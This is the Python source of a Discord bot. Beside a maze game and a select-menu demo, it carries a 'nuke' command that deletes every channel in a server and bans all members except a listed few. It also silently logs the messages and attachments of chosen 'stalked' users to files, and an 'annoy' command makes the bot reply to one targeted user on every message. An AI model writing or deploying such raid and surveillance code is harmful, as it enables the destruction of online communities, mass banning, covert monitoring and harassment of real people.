import asyncio
import os
import json
import discord
from discord import Intents
from discord.ext import commands
from discord.ui import Select
from discord.ui import View
from dotenv import load_dotenv

# Setup
intents = Intents.all()
client = commands.Bot(command_prefix=">", intents=intents)
client.remove_command("help")

# Parameters
json_file = open("config.json")
config = json.load(json_file)
json_file.close()
authorized_users = config["authorized_users"]
ban_exceptions = config["ban_exceptions"]
ending_channels = config["ending_channels"]
stalked_users = config["stalked_users"]
annoyed_user = False
active_games = {}


# Functions
@client.event
async def on_message(ctx):
    # Respond to specific user
    if ctx.author.id == annoyed_user:
        await ctx.reply("TURKEY IS GREATEST COUNTRY")
    # Log messages
    if ctx.author.id in stalked_users:
        message = ctx.content
        if ctx.attachments:
            message += str(ctx.attachments)
        file = open(f"Data/UserLogs/{ctx.author.id}.txt", "a+", encoding="utf-8")
        file.write(f"{ctx.author.id}: {message}")
        file.close()
    await client.process_commands(ctx)


@client.command()
async def nuke(ctx):
    os.system("cls")
    if ctx.author.id not in authorized_users:
        print("Unauthorized user attempted to use command.")
        return
    channels_not_deleted = []
    members_not_banned = []
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except discord.errors.Forbidden:
            channels_not_deleted.append(channel.name)
    for user in ctx.guild.members:
        if user.id not in ban_exceptions:
            try:
                await user.ban()
            except discord.errors.Forbidden:
                if not user.bot:
                    members_not_banned.append(f"{user.name}#{user.discriminator}")
    for channel_name in ending_channels:
        await ctx.guild.create_text_channel(channel_name)
    print("Nuke activated.")
    print(f"Member not banned: {len(members_not_banned) > 1}")
    print(f"Channel not deleted: {len(channels_not_deleted) > 0}")
    if len(members_not_banned) > 1:
        print("===========================")
        print(f"Members not banned:\n{', '.join(members_not_banned)}")
    if len(channels_not_deleted) > 0:
        print("===========================")
        print(f"Channels not deleted:\n{', '.join(channels_not_deleted)}")


@client.command()
async def get_user_log(ctx, user_id=None):
    try:
        if not user_id:
            user_id = ctx.author.id
        file = open(f"Data/UserLogs/{user_id}.txt", "r", encoding="utf-8")
        content = file.read()
        content = content.split(f"{user_id}: ")
        print(content[1:])
        file.close()
    except FileNotFoundError:
        print("UserLog with that ID doesn't exist")


@client.command()
async def annoy(ctx, user_id=None):
    global annoyed_user
    if user_id:
        annoyed_user = int(user_id[2:-1])
    else:
        annoyed_user = False


@client.command()
async def start_game(ctx):
    # Game class
    class MazeGame:
        def __init__(self):
            self.player = (10, 5)
            self.empty_board = empty_board[:]
            self.board = empty_board[:]
            self.message = None
            self.embed = None
            self.reaction = None
            self.user = None
            self.temp_player = None

        async def start_game(self):
            # Send embed
            self.embed = discord.Embed(title="⠀⠀   Maze Game Demo", description="\n".join(self.board))
            self.message = await ctx.send(embed=self.embed)
            # Edit embed
            self.board[self.player[0]] = self.board[self.player[0]][:self.player[1]] + "😎" + self.board[self.player[0]][self.player[1] + 1:]
            self.embed = discord.Embed(title="⠀⠀   Maze Game Demo", description="\n".join(self.board))
            self.embed.add_field(name="Level 1:⠀\n", value="⠀\n⠀\n⠀", inline=True)
            await self.message.edit(embed=self.embed)
            # Add controls
            for i in reactions:
                await self.message.add_reaction(i)

        async def game_loop(self):
            # Check function
            def check(msg_reaction, msg_user):
                return msg_user == ctx.message.author and str(msg_reaction) in reactions

            while True:
                # Wait for valid input and remove reaction
                try:
                    self.reaction, self.user = await client.wait_for("reaction_add", timeout=60, check=check)
                except asyncio.TimeoutError:
                    await self.message.delete()
                    del active_games[ctx.author.id]
                    return

                await self.message.remove_reaction(self.reaction, self.user)
                # Game logic
                self.temp_player = self.player
                if str(self.reaction) == "◀":
                    self.player = (self.player[0], self.player[1] - 1)
                elif str(self.reaction) == "▶":
                    self.player = (self.player[0], self.player[1] + 1)
                elif str(self.reaction) == "🔼":
                    self.player = (self.player[0] - 1, self.player[1])
                elif str(self.reaction) == "🔽":
                    self.player = (self.player[0] + 1, self.player[1])
                if self.player[0] > 10 or self.player[1] > 10 or self.player[0] < 0 or self.player[1] < 0 or self.board[self.player[0]][self.player[1]] == "⬜":
                    self.player = self.temp_player
                if self.board[self.player[0]][self.player[1]] == "👑":
                    self.board = self.empty_board[:]
                    self.board[self.player[0]] = self.board[self.player[0]][:self.player[1]] + "😎" + self.board[self.player[0]][self.player[1] + 1:]
                    self.embed = discord.Embed(title="⠀⠀   Maze Game Demo", description="\n".join(self.board))
                    self.embed.add_field(name="Level 1:⠀\n", value="⠀\n⠀⠀⠀⠀⠀⠀⠀⠀You Win!\n⠀", inline=True)
                    await self.message.edit(embed=self.embed)
                    del active_games[ctx.author.id]
                    return

                # Draw screen
                self.board = self.empty_board[:]
                self.board[self.player[0]] = self.board[self.player[0]][:self.player[1]] + "😎" + self.board[self.player[0]][self.player[1] + 1:]
                self.embed = discord.Embed(title="⠀⠀   Maze Game Demo", description="\n".join(self.board))
                self.embed.add_field(name="Level 1:⠀\n", value="⠀\n⠀\n⠀", inline=True)
                await self.message.edit(embed=self.embed)

        async def restart_game(self):
            await self.message.delete()

    # Setup
    file = open("Data/Maps/maze0.txt", "r", encoding="utf-8")
    empty_board = file.read().split("\n")
    reactions = ["◀", "▶", "🔼", "🔽"]
    file.close()
    # Call methods
    if ctx.author.id in active_games:
        await active_games.get(ctx.author.id).restart_game()
    active_games[ctx.author.id] = MazeGame()
    await active_games.get(ctx.author.id).start_game()
    try:
        await active_games.get(ctx.author.id).game_loop()
    except discord.errors.NotFound:
        return


@client.command()
async def test(ctx):
    select = Select(
        placeholder="Select an emotion",
        options=[
            discord.SelectOption(label='Good', emoji="😄"),
            discord.SelectOption(label='Neutral', emoji="😐", ),
            discord.SelectOption(label='Bad', emoji="😔")
        ])
    
    async def my_callback(interaction):
        await interaction.response.send_message(f"You chose: {select.values[0]}")
        
    select.callback = my_callback
    view = View()
    view.add_item(select)
    await ctx.send("How are you feeling?", view=view)
    
    
# Run bot
load_dotenv()
client.run(os.getenv("TOKEN"))


